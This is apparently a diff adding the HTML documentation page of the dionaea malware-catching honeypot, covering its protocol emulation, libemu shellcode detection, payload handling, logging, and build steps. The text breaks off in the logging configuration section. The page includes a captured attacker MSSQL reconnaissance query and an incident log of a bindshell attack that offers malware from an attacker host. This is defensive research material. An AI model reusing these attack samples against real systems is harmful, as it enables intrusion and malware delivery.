@@ -1,0 +1,1939 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+This file is part of the dionaea honeypot
+
+SPDX-FileCopyrightText: 2011-2012 Markus Koetter
+SPDX-FileCopyrightText: 2011 PhiBo (DinoTools)
+
+SPDX-License-Identifier: GPL-2.0-or-later
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <meta name="generator" content=
+  "HTML Tidy for Linux (vers 7 December 2008), see www.w3.org" />
+
+  <title>dionaea &mdash; catches bugs</title>
+  <link rel="stylesheet" type="text/css" href="screen.css" />
+  <meta name="keywords" content=
+  "dionaea, nepenthes, malware, low-interaction, honeypot" />
+</head>
+
+<body>
+  <div id="header">
+    <center>
+      <h1>dionaea</h1>
+
+      <h3>catches bugs</h3>
+    </center>
+  </div>
+
+  <div id="content">
+    <p id="about">Dionaea is meant to be a nepenthes successor,
+    embedding python as scripting language, using libemu to detect
+    shellcodes, supporting ipv6 and tls</p>
+
+    <ul id="nav">
+      <li><a href="#development">Development</a></li>
+
+      <li><a href="#compiling">Compiling &amp;
+      Installation</a></li>
+
+      <li><a href="#update">Update</a></li>
+
+      <li><a href="#running">Running</a></li>
+
+      <li><a href="#configuration">Configuration</a></li>
+
+      <li><a href="#honorem">Honors</a></li>
+
+      <li><a href="#links">Links</a></li>
+
+      <li><a href="#FAQ">FAQ</a></li>
+
+      <li><a href="#segfault">Segfault</a></li>
+
+      <li><a href="#support">Support</a></li>
+
+      <li><a href="http://carnivore.it">Blog</a></li>
+    </ul>
+    <hr id="separator" />
+
+    <h2>How it works</h2>
+
+    <div class="level2">
+      dionaea intention is to trap malware exploiting
+      vulnerabilities exposed by services offerd to a network, the
+      ultimate goal is gaining a copy of the malware.
+    </div>
+
+    <h3>Security</h3>
+
+    <div class="level3">
+      As Software is likely to have bugs, bugs in software offering
+      network services can be exploitable, and dionaea is software
+      offering network services, it is likely dionaea has
+      exploitable bugs.<br />
+      Of course we try to avoid it, but if nobody would fail when
+      trying hard, we would not need software such as
+      dionaea.<br />
+      So, in order to minimize the impact, dionaea can drop
+      privileges, and chroot.<br />
+      To be able to run certain actions which require privileges,
+      after dionaea dropped them, dionaea creates a child process
+      at startup, and asks the child process to run actions which
+      require elevated privileges. This does not guarantee
+      anything, but it should be harder to get gain root access to
+      the system from an unprivileged user in a chroot environment.
+    </div>
+
+    <h3>Network Connectivity</h3>
+
+    <div class="level3">
+      Given the softwares intented use, network io is crucial. All
+      network io is within the main process in a so called
+      non-blocking manner. To understand nonblocking, imagine you
+      have many pipes infront of you, and these pipes can send you
+      something, and you can put something into the pipe. If you
+      want to put something into a pipe, while it is crowded, you'd
+      have to wait, if you want to get something from a pipe, and
+      there is nothing, you'd have to wait too. Doing this pipe
+      game non-blocking means you won't wait for the pipes to be
+      write/readable, you'll get something off the pipes once data
+      arrives, and write once the pipe is not crowded. If you want
+      to write a large chunk to the pipe, and the pipe is crowded
+      after a small piece, you note the rest of the chunk you
+      wanted to write, and wait for the pipe to get ready.<br />
+      DNS resolves are done using libudns, which is a neat
+      non-blocking dns resolving library with support for AAAA
+      records and chained cnames.<br />
+      So much about non-blocking.<br />
+      dionaea uses libev to get notified once it can act on a
+      socket, read or write.<br />
+      dionaea can offer services via tcp/udp and tls for IPv4 and
+      IPv6, and can apply rate limiting and accounting limits per
+      connections to tcp and tls connections - if required.
+    </div>
+
+    <h3>Protocols</h3>
+
+    <div class="level3">
+      Network services speak a certain language, this language is
+      called protocol.<br />
+      When we started deploying honeypots, you could trap worms
+      just by opening a single port, and wait for them to connect
+      and send you an url where you could download a copy of the
+      worm. The service getting attacked was the backdoor of the
+      bagle mailworm, and it did not require and interaction.<br />
+      Later on, the exploitations of real services got more
+      complex, and you had to reply something to the worm to fool
+      him.<br />
+      Nowadays worms use API to access services, before sending
+      their payload. To allow easy adjustments to the procotol,
+      dionaea implements the protocols in python. There is a glue
+      between the network layer which is done in the c programming
+      language and the embedded python scripting language, which
+      allows using the non-blocking connections in python. This has
+      some benefits, for example we can use non-blocking tls
+      connections in python, and we even get rate limiting on them
+      (if required), where pythons own io does not offer such
+      things. On the other hand, it is much more comfortable to
+      implement protocols in python than doing the same in c.
+    </div>
+
+    <h4>SMB</h4>
+
+    <div class="level4">
+      The main protocol offerd by dionaea is SMB. SMB has a decent
+      history of remote exploitable bugs, and is a very popular
+      target for worms. dionaeas SMB implementation makes use of an
+      python3 adapted version of scapy. As scapys own version of
+      SMB was pretty limited, almost everything but the Field
+      declarations had to be rewritten. The SMB emulation written
+      for dionaea is used by the <a href=
+      "http://code.mwcollect.org">mwcollectd</a> low interaction
+      honeypot too.<br />
+      Besides the known attacks on SMB dionaea supports uploading
+      files to smb shares.<br />
+      Adding new DCE remote procedure calls is a good start to get
+      into dionaea code, you can use:
+      <pre>
+SELECT
+        COUNT(*),
+        dcerpcrequests.dcerpcrequest_uuid,
+        dcerpcservice_name,
+        dcerpcrequest_opnum
+FROM
+        dcerpcrequests
+        JOIN dcerpcservices ON(dcerpcrequests.dcerpcrequest_uuid == dcerpcservices.dcerpcservice_uuid)
+        LEFT OUTER JOIN dcerpcserviceops ON(dcerpcserviceops.dcerpcserviceop_opnum = dcerpcrequest_opnum AND dcerpcservices.dcerpcservice = dcerpcserviceops.dcerpcservice )
+WHERE
+        dcerpcserviceop_name IS NULL
+GROUP BY
+        dcerpcrequests.dcerpcrequest_uuid,dcerpcservice_name,dcerpcrequest_opnum
+ORDER BY
+        COUNT(*) DESC;
+</pre><br />
+      to identify potential usefull targets of unknown dcerpc calls
+      using the data you gathered and stored in your logsql
+      database. Patches are appreciated.
+    </div>
+
+    <h4>http</h4>
+
+    <div class="level4">
+      Dionaea supports http on port 80 as well as https, but there
+      is no code making use of the data gathered on these
+      ports.<br />
+      For https, the self-signed ssl certificate is created at
+      startup.
+    </div>
+
+    <h4>ftp</h4>
+
+    <div class="level4">
+      Dionaea provives a basic ftp server on port 21, it can create
+      directories and upload and download files. From my own
+      experience there are very little automated attacks on ftp
+      services and I'm yet to see something interesting happening
+      on port 21.
+    </div>
+
+    <h4>tftp</h4>
+
+    <div class="level4">
+      Written to test the udp connection code, dionaea provides a
+      tftp server on port 69, which can serve files. Even though
+      there were vulnerabilities in tftp services, I'm yet to see
+      an automated attack on tftp services.
+    </div>
+
+    <h4>MSSQL</h4>
+
+    <div class="level4">
+      This module implements the Tabular Data Stream protocol which
+      is used by Microsoft SQL Server. It listens to tcp/1433 and
+      allows clients to login. It can decode queries run on the
+      database, but as there is no database, dionaea can't reply,
+      and there is no further action. Typically we always get the
+      same query:
+      <pre>
+
+exec sp_server_info 1 exec sp_server_info 2 exec sp_server_info 500 select 501,NULL,1 where 'a'='A' select 504,c.name,c.description,c.definition from master.dbo.syscharsets c,master.dbo.syscharsets c1,master.dbo.sysconfigures f where f.config=123 and f.value=c1.id and c1.csid=c.id set textsize 2147483647 set arithabort on
+
+</pre>Refer to the <a href=
+"http://carnivore.it/2010/09/11/mssql_attacks_examined">blog</a>
+for more information.<br />
+      Patches would be appreciated.
+    </div>
+
+    <h4>MySQL</h4>
+    <div class="level4">
+      This module implements the MySQL wire stream protocol - backed up by
+      sqlite as database. Please refer to <a
+      href="http://carnivore.it/2011/05/15/extending_dionaea">2011-05-15
+      Extending Dionaea</a> for more information.
+    </div>
+
+    <h4>SIP (VoIP)</h4>
+
+    <div class="level4">
+      This is a VoIP module for the honeypot dionaea. The VoIP
+      protocol used is SIP since it is the de facto standard for
+      VoIP today. In contrast to some other VoIP honeypots, this
+      module doesn't connect to an external VoIP registrar/server.
+      It simply waits for incoming SIP messages (e.g. OPTIONS or
+      even INVITE), logs all data as honeypot incidents and/or
+      binary data dumps (RTP traffic), and reacts accordingly, for
+      instance by creating a SIP session including an RTP audio
+      channel. As sophisticated exploits within the SIP payload are
+      not very common yet, the honeypot module doesn't pass any
+      code to dionaea's code emulation engine. This will be
+      implemented if we spot such malicious messages. The main
+      features of the VoIP module are:
+
+      <ul>
+        <li>Support for most SIP requests (OPTIONS, INVITE, ACK,
+        CANCEL, BYE)</li>
+
+        <li>Support for multiple SIP sessions and RTP audio
+        streams</li>
+
+        <li>Record all RTP data (optional)</li>
+
+        <li>Set custom SIP username and secret (password)</li>
+
+        <li>Set custom useragent to mimic different phone
+        models</li>
+
+        <li>Uses dionaea's incident system to log to SQL
+        database</li>
+      </ul><br />
+    </div>
+
+    <h5>Personalities</h5>
+
+    <div class="level5">
+      A personality defines how to handle a request. At least the
+      'default' personality MUST exist. The following options are
+      available per personality.
+
+      <dl>
+        <dt>serve</dt>
+        <dd>
+          A list of IP addresses to use this personality for.
+        </dd>
+        <dt>handle</dt>
+        <dd>
+          List of SIP methods to handle.
+        </dd>
+      </dl>
+    </div>
+
+    <h5>SIP Users</h5>
+
+    <div class="level5">
+      You can easily add, change or remove users by editing the SQLite
+      file specified by the 'users = ""' parameter in the config file.
+      All users are specified in the users table.
+
+      <dl>
+        <dt>username</dt>
+        <dd>
+          Specifies the name of the user. This value is treated as
+          regular expression. See
+          <a href="http://docs.python.org/py3k/library/re.html">
+            Python: Regular Expressions
+          </a> for more information.
+        </dd>
+        <dt>password</dt>
+        <dd>
+          The password.
+        </dd>
+        <dt>personality</dt>
+        <dd>
+          The user is only available in the personality specified
+          by this value. You can define a personality in the config
+          file.
+        </dd>
+        <dt>pickup_delay_min</dt>
+        <dd>
+          This is an integer value. Let the phone ring for at
+          least this number of seconds.
+        </dd>
+        <dt>pickup_delay_max</dt>
+        <dd>
+          This is an integer value. Maximum number of seconds
+          to wait before dionaea picks up the phone.
+        </dd>
+        <dt>action</dt>
+        <dd>
+          This value isn't in use, yet.
+        </dd>
+        <dt>sdp</dt>
+        <dd>
+          The name of the SDP to use. See table 'sdp'.
+        </dd>
+      </dl>
+    </div>
+
+    <h5>SDP</h5>
+
+    <div class="level5">
+      All SDPs can be defined in the sdp table in the users database.
+
+      <dl>
+        <dt>name</dt>
+        <dd>Name of the SDP</dd>
+        <dt>sdp</dt>
+        <dd>The value to use as SDP</dd>
+      </dl>
+
+      The following values are available in the SDP definition.
+
+      <dl>
+        <dt>{addrtype}</dt>
+        <dd>
+          Address type. (IP4 or IP6)
+        </dd>
+        <dt>{unicast_address}</dt>
+        <dd>
+          RTP address
+        </dd>
+        <dt>{audio_port}</dt>
+        <dd>
+          Dionaea audio port.
+        </dd>
+        <dt>{video_port}</dt>
+        <dd>
+          Dionaea video port.
+        </dd>
+      </dl>
+
+      The following control parameters are available in the SDP definition.
+
+      <dl>
+        <dt>[audio_port]...content...[/audio_port]</dt>
+        <dd>
+          The content is only available in the output if the audio_port
+          value is set.
+        </dd>
+        <dt>[video_port]...content...[/video_port]</dt>
+        <dd>
+          The content is only available in the output if the video_port
+          value is set.
+        </dd>
+      </dl>
+
+      Example:
+
+      <pre>
+v=0
+o=- 1304279835 1 IN {addrtype} {unicast_address}
+s=SIP Session
+c=IN {addrtype} {unicast_address}
+t=0 0
+[audio_port]
+m=audio {audio_port} RTP/AVP 111 0 8 9 101 120
+a=sendrecv
+a=rtpmap:111 Speex/16000/1
+a=fmtp:111 sr=16000,mode=any
+a=rtpmap:0 PCMU/8000/1
+a=rtpmap:8 PCMA/8000/1
+a=rtpmap:9 G722/8000/1
+a=rtpmap:101 telephone-event/8000
+a=fmtp:101 0-16,32,36
+a=rtpmap:120 NSE/8000
+a=fmtp:120 192-193
+[/audio_port]
+[video_port]
+m=video {video_port} RTP/AVP 34 96 97
+c=IN {addrtype} {unicast_address}
+a=rtpmap:34 H263/90000
+a=fmtp:34 QCIF=2
+a=rtpmap:96 H263-1998/90000
+a=fmtp:96 QCIF=2
+a=rtpmap:97 H263-N800/90000
+[/video_port]
+      </pre>
+
+    </div>
+
+    <h3>Exploitation</h3>
+
+    <div class="level3">
+      Attackers do not seek your service, attackers want to exploit
+      you, they'll chat with the service for some packets, and
+      afterwards sent a payload. dionaea has to detect and evaluate
+      the payload to be able to gain a copy of the malware. In
+      order to do so, dionaea uses libemu.<br />
+      Given certain circumstances, libemu can detect shellcode,
+      measure the shellcode, and if required even execute the
+      shellcode. Shellcode detection is done by making use of GetPC
+      heuristics, others wrote papers about it, we decided to write
+      libemu to do so. This detection is rather time consuming, and
+      therefore done using threads.<br />
+      The part of dionaea which takes care of the network io can
+      create a copy of all in/output run for a connection, this
+      copy is passed to the detection facility, which is a tree of
+      detection facilities, at this moment there is only a single
+      leaf, the emu plugin. The emu plugin uses threads and libemu
+      to detect and profile/measure shellcode.<br />
+      Shellcode measurement/profiling is done by running the
+      shellcode in the libemu vm and recording API calls and
+      arguments. For most shellcode profiling is sufficient, the
+      recorded API calls and arguments reveal enough information to
+      get an idea of the attackers intention and act upon them. For
+      multi-stage shellcode, where the first exploitation stage of
+      the shellcode would retrieve a second shellcode from the
+      attacker, profiling is not sufficient, as we lack the
+      information 'what to do' from the second stage of the
+      shellcode, in this case we need to make use of shellcode
+      execution. Shellcode execution is basically the same as
+      shellcode profiling, the only difference is not recording the
+      api calls, and we allow the shellcode to take certain
+      actions, for example creating a network connection.
+    </div>
+
+    <h4>Payloads</h4>
+
+    <div class="level4">
+      Once we have the payload, and the profile, dionaea has to
+      guess the intention, and act upon it
+    </div>
+
+    <h5>Shells - bind/connectback</h5>
+
+    <div class="level5">
+      This payload offers a shell (cmd.exe prompt) to the attacker,
+      either by binding a port and waiting for the attacker to
+      connect to us again, or by connection to the attacker. In
+      both cases, dionaea offers an cmd.exe emulation to the
+      attacker, parses the input, and acts upon the input, usually
+      the instructions download a file via ftp or tftp.
+    </div>
+
+    <h5>URLDownloadToFile</h5>
+
+    <div class="level5">
+      These shellcodes use the URLDownloadToFile api call to
+      retrieve a file via http, and execute the retrieved file
+      afterwards
+    </div>
+
+    <h5>Exec</h5>
+
+    <div class="level5">
+      Making use of WinExec, these shellcode execute a single
+      command which has to be parsed and processed like the
+      bind/connectback shell shellcommands.
+    </div>
+
+    <h5>Multi Stage Payloads</h5>
+
+    <div class="level5">
+      We never know what the second stage is, therefore libemu is
+      used to execute the shellcode in the libemu vm.
+    </div>
+
+    <h3>Downloads</h3>
+
+    <div class="level3">
+      Once dionaea gained the location of the file the attacker
+      wants it to downloads from the shellcode, dionaea will try to
+      download the file. The protocol to downloads files via tftp
+      and ftp is implemented in python (ftp.py and tftp.py) as part
+      of dionaea, downloading files via http is done in the curl
+      module - which makes use of libcurl's awsome http
+      capabilities. Of course libcurl can run downloads for ftp
+      too, but the ftp services embedded in malware a designed to
+      work with windows ftp.exe client, and fail for others.
+    </div>
+
+    <h3>Submit</h3>
+
+    <div class="level3">
+      Once dionaea got a copy of the worm attacking her, we may
+      want to store the file locally for further analysis, or
+      submit the file to some 3rd party for further analysis.<br />
+      dionaea can http/POST the file to several services like
+      CWSandbox, Norman Sandbox or VirusTotal.
+    </div>
+
+    <h3>Logging</h3>
+
+    <div class="level3">
+      Getting a copy of the malware is cool, getting an overview of
+      the attacks run on your sensor is priceless.<br />
+      dionaea can write information to a text file, but be aware,
+      dionaeas logging to text files is rather chatty, really
+      chatty, and you do not want to look at the information, if
+      you are not debugging the software or writing some new
+      feature for it.<br />
+      Of course, you can appy filters to the logging, to limit it
+      to different facilities or levels, but in general you do not
+      want to work with text files.<br />
+      dionaea uses some internal communication system which is
+      called incidents. An incident has an origin, which is a
+      string, a path, and properties, which can be integers,
+      strings, or a pointer to a connection. Incidents limit to the
+      max, they pass the information required to incident handlers
+      (ihandler). An ihandler can register a path for incidents he
+      wants to get informed about, the pathes are matched in a glob
+      like fashion. Therefore logging information using an ihandler
+      is superior to text logging, you get the information you are
+      looking for, and can write it to a format you choose
+      yourself. This is what the logsql python script does, it is
+      an ihandler, and writes interesting incidents to a sqlite
+      database, one of the benefits of this logging is the ability
+      to cluster incidents based on the initial attack when
+      retrieving the data from the database:
+    </div>
+    <pre>
+connection 610 smbd tcp accept 10.69.53.52:445 &lt;- 10.65.34.231:2010
+ dcerpc request: uuid '3919286a-b10c-11d0-9ba8-00c04fd92ef5' opnum 9
+ p0f: genre:'Windows' detail:'XP SP1+, 2000 SP3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0'
+ profile: [{'return': '0x7c802367', 'args': ['', 'CreateProcessA'], 'call': 'GetProcAddress'},
+            ...., {'return': '0', 'args': ['0'], 'call': 'ExitThread'}]
+ service: bindshell://1957
+ connection 611 remoteshell tcp listen 10.69.53.52:1957
+   connection 612 remoteshell tcp accept 10.69.53.52:1957 &lt;- 10.65.34.231:2135
+     p0f: genre:'Windows' detail:'XP SP1+, 2000 SP3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0'
+     offer: fxp://1:1@10.65.34.231:8218/ssms.exe
+     download: 1d419d615dbe5a238bbaa569b3829a23 fxp://1:1@10.65.34.231:8218/ssms.exe
+     connection 613 ftpctrl tcp connect 10.69.53.52:37065 -&gt; 10.65.34.231/None:8218
+       connection 614 ftpdata tcp listen 10.69.53.52:62087
+         connection 615 ftpdata tcp accept 10.69.53.52:62087 &lt;- 10.65.34.231:2308
+           p0f: genre:'Windows' detail:'XP SP1+, 2000 SP3' uptime:'-1' tos:'' dist:'11' nat:'0' fw:'0'
+</pre>
+
+    <div class="level3">
+      Additionally, you can query the database for many different
+      things, refer to:
+
+      <ul>
+        <li><a href=
+        "http://carnivore.it/2009/11/06/dionaea_sql_logging">dionaea
+        sql logging 2009/11/06</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/08/post_it_yourself">post it
+        yourself 2009/12/08</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/12/sqlite_performance">sqlite
+        performance 2009/12/12</a></li>
+
+        <li><a href=
+        "http://carnivore.it/2009/12/14/virustotal_fun">virustotal
+        fun 2009/12/14</a></li>
+
+        <li><a href="http://infosanity.wordpress.com/">Andrew
+        Waite's Blog</a> for mimic-nepstats.py</li>
+      </ul>for more examples how to make use of the database.<br />
+      <br />
+      Additional to local logging, dionaea can send a contionous
+      stream of its attacks to a xmpp server, which allows creating
+      a distributed setup of sensors with high detail of
+      information for each attack.<br />
+      Refer to <a href="#logxmpp">logxmpp</a> and <a href=
+      "#pg_backend">pg_backend</a> for more information about
+      distributed setups using xmpp.
+    </div>
+    <hr id="separator" />
+
+    <h2 id="development">Development</h2>dionaea initial
+    development was funded by the <a href=
+    "http://honeynet.org/">Honeynet Project</a> as part of the
+    Honeynets Summer of Code during 2009. The development process
+    is as open as possible; you can <a href=
+    "http://src.carnivore.it/dionaea">browse</a> the
+    source online and subscribe to <a href=
+    "http://src.carnivore.it/dionaea/atom">
+    RSS updates</a> and <a href="mailto:nepenthes-devel@lists.sourceforge.net">
+    submit bugs or patches</a>.
+
+    <h2 id="compiling">Compiling &amp; Installation</h2>
+
+    <h3>Requirements</h3>
+
+    <ul>
+      <li><a href="#install_libev">libev</a> &gt;=4.04, <a href=
+      "http://software.schmorp.de/pkg/libev.html">schmorp.de</a></li>
+
+      <li><a href="#install_glib">libglib</a> &gt;=2.20</li>
+
+      <li><a href="#install_openssl">libssl</a>, <a href=
+      "http://www.openssl.org">openssl.org</a></li>
+
+      <li><a href="#install_liblcfg">liblcfg</a>, <a href=
+      "http://liblcfg.carnivore.it">liblcfg.carnivore.it</a></li>
+
+      <li><a href="#install_libemu">libemu</a>, <a href=
+      "http://libemu.carnivore.it">libemu.carnivore.it</a></li>
+
+      <li><a href="#install_python">python</a> &gt;=3.2, <a href=
+      "http://www.python.org">python.org</a></li>
+
+      <li>
+        <ul>
+          <li><a href="#install_sqlite">sqlite</a> &gt;=3.3.6
+          <a href="http://www.sqlite.org">sqlite.org</a></li>
+
+          <li><a href="#install_readline">readline</a> &gt;=3
+          <a href=
+          "http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html">
+          cnswww.cns.cwru.edu</a></li>
+        </ul>
+      </li>
+
+      <li><a href="#install_cython">cython</a> &gt;0.14.1, <a href=
+      "http://www.cython.org">cython.org</a></li>
+
+      <li><a href="#install_udns">libudns</a>, <a href=
+      "http://www.corpit.ru/mjt/udns.html">corpit.ru</a></li>
+
+      <li><a href="#install_curl">libcurl</a> &gt;=7.18, <a href=
+      "http://curl.haxx.se">curl.haxx.se</a></li>
+
+      <li><a href="#install_pcap">libpcap</a> &gt;=1.1.1, <a href=
+      "http://www.tcpdump.org">tcpdump.org</a></li>
+
+      <li><a href="#install_nl">libnl</a> from git, <a href=
+      "http://www.infradead.org/~tgr/libnl/">infradead.org</a>
+      (optional)</li>
+
+      <li>libgc &gt;=6.8, <a href=
+      "http://linux.maruhn.com/sec/libgc.html">hp.com</a>
+      (optional)</li>
+    </ul>
+
+    <h3>Ubuntu</h3>Some packages are provided by the apt-tree, so
+    you don't have to install everything from source
+    <pre>
+aptitude install libudns-dev libglib2.0-dev libssl-dev libcurl4-openssl-dev \
+libreadline-dev libsqlite3-dev python-dev \
+libtool automake autoconf build-essential \
+subversion git-core \
+flex bison \
+pkg-config
+</pre>
+
+    <h3>tar xfz ...</h3>The remaining dependencies have to be
+    installed from source, we will install all dependencies to
+    <kbd>/opt/dionaea</kbd> here, so make sure the directory
+    exists, and you are allowed to write it.
+
+    <h4 id="install_glib">libglib (debian &lt;= etch)</h4>If your lack a recent glib, better update your operating system.
+
+    <h4 id="install_liblcfg">liblcfg (all)</h4>
+    <pre>
+git clone git://git.carnivore.it/liblcfg.git liblcfg
+cd liblcfg/code
+autoreconf -vi
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+cd ..
+</pre>
+
+    <h4 id="install_libemu">libemu (all)</h4>
+    <pre>
+git clone git://git.carnivore.it/libemu.git libemu
+cd libemu
+autoreconf -vi
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+</pre>
+
+    <h4 id="install_nl">libnl (linux &amp;&amp; optional)</h4>
+In case you use Ubuntu, libnl3 may be available in apt,
+    <pre>
+apt-get install libnl-3-dev libnl-genl-3-dev libnl-nf-3-dev libnl-route-3-dev
+    </pre>
+else install it from git.
+    <pre>
+git clone git://git.infradead.org/users/tgr/libnl.git
+cd libnl
+autoreconf -vi
+export LDFLAGS=-Wl,-rpath,/opt/dionaea/lib
+./configure --prefix=/opt/dionaea
+make
+make install
+cd ..
+</pre>
+
+    <h4 id="install_libev">libev (all)</h4>
+    <pre>
+wget http://dist.schmorp.de/libev/Attic/libev-4.04.tar.gz
+tar xfz libev-4.04.tar.gz
+cd libev-4.04
+./configure --prefix=/opt/dionaea
+make install
+cd ..
+</pre>
+
+    <h4 id="install_python">Python 3.2</h4>Before installing
+    Python, we will install required dependencies
+
+    <h5 id="install_readline">readline</h5>Should be available for
+    every distribution.
+
+    <h5 id="install_sqlite">sqlite &gt; 3.3</h5>Should be available
+    for every distribution. If your distributions sqlite version is
+    &lt; 3.3 and does not support triggers, you are doomed, please
+    let me know, I'll write about how broken pythons build scripts
+    are, and document how to to compile it with a user- provided -
+    more recent - sqlite version.
+
+    <h5>Python</h5>
+    <pre>
+wget http://www.python.org/ftp/python/3.2.2/Python-3.2.2.tgz
+tar xfz Python-3.2.2.tgz
+cd Python-3.2.2/
+./configure --enable-shared --prefix=/opt/dionaea --with-computed-gotos \
+      --enable-ipv6 LDFLAGS="-Wl,-rpath=/opt/dionaea/lib/ -L/usr/lib/x86_64-linux-gnu/"
+
+make
+make install
+</pre>
+
+    <h4 id="install_cython">Cython (all)</h4> We have to use cython >= 0.15 as
+    previous releases do not support Python3.2 __hash__'s Py_Hash_type for x86.
+    <pre>wget http://cython.org/release/Cython-0.15.tar.gz
+tar xfz Cython-0.15.tar.gz
+cd Cython-0.15
+/opt/dionaea/bin/python3 setup.py install
+cd ..
+</pre>
+
+    <h4 id="install_udns">udns (!ubuntu)</h4>udns does not use
+    autotools to build.
+    <pre>
+wget http://www.corpit.ru/mjt/udns/old/udns_0.0.9.tar.gz
+tar xfz udns_0.0.9.tar.gz
+cd udns-0.0.9/
+./configure
+make shared
+</pre>There is no make install, so we copy the header to our
+include directory.
+    <pre>
+ cp udns.h /opt/dionaea/include/
+</pre>and the lib to our library directory.
+    <pre>
+ cp *.so* /opt/dionaea/lib/
+cd /opt/dionaea/lib
+ln -s libudns.so.0 libudns.so
+cd -
+cd ..
+</pre>
+
+    <h4 id="install_curl">libcurl (all)</h4>Grabbing curl from your
+    distributions maintainer should work, if you run a decent
+    distribution. If not consider upgrading your operating system.<br />
+
+    <h4 id="install_pcap">libpcap (most)</h4>To honor the effort,
+    we rely on libpcap 1.1.1. Most distros ship older versions,
+    therefore it is likely you have to install it from source.
+    <pre>
+wget http://www.tcpdump.org/release/libpcap-1.1.1.tar.gz
+tar xfz libpcap-1.1.1.tar.gz
+cd libpcap-1.1.1
+./configure --prefix=/opt/dionaea
+make
+make install
+cd ..
+</pre>
+
+    <h4 id="install_openssl">OpenSSL
+    (optional)</h4><strong>WARNING:</strong> doing this, requires
+    *all* dependencies to be compiled using the same ssl version,
+    so you have to link curl and python to your own openssl build
+    too<br />
+    If you experience problems with tls connections, install your
+    OpenSSL &gt;= 0.9.8l/1.0.0-beta2, or fall back to cvs for now.
+    <pre>
+cvs -d anonymous@cvs.openssl.org:/openssl-cvs co openssl
+cd openssl
+./Configure shared --prefix=/opt/dionaea linux-x86_64
+make SHARED_LDFLAGS=-Wl,-rpath,/opt/dionaea/lib
+make install
+</pre>
+
+    <h3>Compiling dionaea</h3>
+    <pre>
+git clone git://git.carnivore.it/dionaea.git dionaea
+</pre>then ..
+    <pre>
+cd dionaea
+autoreconf -vi
+./configure --with-lcfg-include=/opt/dionaea/include/ \
+      --with-lcfg-lib=/opt/dionaea/lib/ \
+      --with-python=/opt/dionaea/bin/python3.2 \
+      --with-cython-dir=/opt/dionaea/bin \
+      --with-udns-include=/opt/dionaea/include/ \
+      --with-udns-lib=/opt/dionaea/lib/ \
+      --with-emu-include=/opt/dionaea/include/ \
+      --with-emu-lib=/opt/dionaea/lib/ \
+      --with-gc-include=/usr/include/gc \
+      --with-ev-include=/opt/dionaea/include \
+      --with-ev-lib=/opt/dionaea/lib \
+      --with-nl-include=/opt/dionaea/include \
+      --with-nl-lib=/opt/dionaea/lib/ \
+      --with-curl-config=/usr/bin/ \
+      --with-pcap-include=/opt/dionaea/include \
+      --with-pcap-lib=/opt/dionaea/lib/ <!-- \
+     - -with-ssl-include=/opt/dionaea/include \
+      - -with-ssl-lib=/opt/dionaea/lib/ \
+      - -with-glib=/opt/dionaea -->
+make
+make install
+</pre>
+
+    <h2 id="update">Update dionaea</h2>
+
+    <div class="level2">
+      Most updates boil down to a
+      <pre>
+git pull;
+make clean install
+</pre>But, you always want to make sure your config file is up to
+date, you can use
+      <pre>
+/opt/dionaea/etc/dionaea# diff dionaea.conf dionaea.conf.dist
+</pre>
+    </div>
+
+    <h2 id="packages">Packages</h2>
+    <div class="level2">
+      The packages below are 3rd party provided, which is appreciated. If you have compiled a package for your own distribution, just send me the link.
+    <ul>
+			<li><a href="https://launchpad.net/~honeynet">Ubuntu Lucid</a> - weekly git snapshots</li>
+			<li><a href="http://carnivore.it/2010/05/18/debianization">Debian</a> - not really packages, just a guide how to create packages</li>
+			<li><a href="http://aur.archlinux.org/packages.php?ID=36944">Arch Linux</a> - build scripts, compile from source, uses git</li>
+      <li><a href="http://maimed.org/~pyllyukko/stuff.shtml">Slackware</a> - build scripts, compile from source, uses git</li>
+    </div>
+
+    <h2 id="running">Running dionaea</h2>
+
+    <div class="level2">
+      The software has some flags you can provide at startup, the
+      -h flags shows the help, the -H includes the default values.
+    </div>
+    <pre>
+  -c, --config=FILE               use FILE as configuration file
+                                    Default value/behaviour: /opt/dionaea/etc/dionaea.conf
+  -D, --daemonize                 run as daemon
+  -g, --group=GROUP               switch to GROUP after startup (use with -u)
+                                    Default value/behaviour: keep current group
+  -G, --garbage=[collect|debug]   garbage collect,  usefull to debug memory leaks,
+                                  does NOT work with valgrind
+  -h, --help                      display help
+  -H, --large-help                display help with default values
+  -l, --log-levels=WHAT           which levels to log, valid values
+                                  all, debug, info, message, warning, critical, error
+                                  combine using ',', exclude with - prefix
+  -L, --log-domains=WHAT          which domains use * and ? wildcards, combine using ',',
+                                  exclude using -
+  -u, --user=USER                 switch to USER after startup
+                                    Default value/behaviour: keep current user
+  -p, --pid-file=FILE             write pid to file
+  -r, --chroot=DIR                chroot to DIR after startup
+                                    Default value/behaviour: don't chroot
+  -V, --version                   show version
+  -w, --workingdir=DIR            set the process' working dir to DIR
+                                    Default value/behaviour: /opt/dionaea
+
+examples:
+# dionaea -l all,-debug -L '*'
+# dionaea -l all,-debug -L 'con*,py*'
+# dionaea -u nobody -g nogroup -r /opt/dionaea/ -w /opt/dionaea -p /opt/dionaea/var/dionaea.pid
+</pre>
+
+    <h2 id="configuration">Configuration - dionaea.conf</h2>
+
+    <div class="level2">
+      If you want to change the software, it is really important to
+      understand how it works, therefore please take the time to
+      how it works.<br />
+      <kbd>dionaea.conf</kbd> is the main configuration file, the
+      file controls consists of sections for:
+
+      <ul>
+        <li>logging</li>
+
+        <li>processors</li>
+
+        <li>downloads</li>
+
+        <li>bistreams</li>
+
+        <li>submit</li>
+
+        <li>listen</li>
+
+        <li>modules</li>
+      </ul>
+
+      <h3 id="logging">logging</h3>
+
+      <div class="level3">
+        The <kbd>logging</kbd> section controls ... logging, you
+        can specify log domains and loglevel for different
+        logfiles.<br />
+        As dionaea is pretty ... verbose, it is useful to rotate
+        the logfiles using logrotate.
+        <pre>
+# logrotate requires dionaea to be started with a pidfile
+# in this case -p /opt/dionaea/var/run/dionaea.pid
+# adjust the path to your needs
